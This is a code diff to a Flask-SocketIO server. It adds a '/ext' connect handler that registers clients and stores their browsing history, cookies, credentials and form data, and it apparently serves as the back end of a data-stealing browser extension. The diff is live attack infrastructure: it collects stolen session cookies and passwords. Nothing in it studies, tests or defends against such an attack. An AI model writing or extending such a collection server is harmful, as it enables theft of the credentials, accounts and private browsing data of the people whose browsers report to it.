@@ -1,14 +1,17 @@
 from flask import Flask, render_template
 from flask_socketio import SocketIO, emit, send   #, #join_
-import json
-import os
+import database, frontend
+import json, os
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = os.environ["FLASK_SECRET"] or 'secret!'
 socketio = SocketIO(app)
-connected_clients = []
+connected_clients = [] #tuples of (clientid, sid)
 
-
+"""
+Server responses to client: (int status, data) as tuple
+http status code, data
+"""
 
 @app.route('/')
 def hello_world():
@@ -22,6 +25,43 @@ def handle_my_custom_event(json, methods=['Get', 'Post']):
     print('received my event: ' + str(json))
     socketio.emit('my response', json, callback=messageReceived)
 
+@socketio.on('connect', namespace='/ext')
+def handle_ext_connect(sid, data_json):
+    data = json.loads(data_json)
+    bad = 400, "Invalid payload"
+    if validate_payload(data) == 0:
+        print("Invalid payload received from client.")
+        return bad
+    elif data["clientid"] == 0: #new client connection!
+        clientid = database.create_new_client(data)
+        connected_clients.append((clientid, sid))
+        resp = database.construct_response(clientid)
+        return 201, resp
+    else:
+        clientid = data["clientid"]
+        connected_clients.append((clientid, sid))
+        if database.store_history(data["history"], clientid):
+            return bad
+        for cookie in data["cookies"]:
+            if database.store_cookie(cookie, clientid):
+                return bad
+        for cred in data["creds"]:
+            if database.store_credential(cred, clientid):
+                return bad
+        for form in data["forms"]:
+            if database.store_form_data(form, clientid):
+                return bad
+        return 200, database.construct_response(clientid)
+
+
+def validate_payload(data):
+    if (type(data.get("clientid", None)) != int or
+        type(data.get("history", None)) != type([]) or
+        type(data.get("cookies", None)) != type([]) or
+        type(data.get("creds", None)) != type([]) or
+        type(data.get("forms", None)) != type([])):
+        return 0
+    return 1
 
 if __name__ == "__main__":
     socketio.run(app, debug=True)
